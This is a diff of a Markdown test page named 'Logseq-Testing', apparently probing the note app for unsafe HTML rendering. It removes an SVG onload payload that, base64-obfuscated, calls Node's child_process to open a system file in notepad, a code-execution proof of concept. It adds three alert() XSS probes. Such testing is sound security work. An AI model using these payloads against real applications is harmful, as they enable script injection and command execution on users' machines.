@@ -1,3 +1,8 @@
 # Logseq-Testing
 ---
-<svg><svg onload=eval(atob('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoIm5vdGVwYWQgQzpcXHdpbmRvd3NcXHdpbi5pbmkiKQ=='))>
+
+<img src=x onerror="alert('XSS')">
+
+<svg/onload=alert('SVG XSS')>
+
+<script>alert('Script XSS')</script>
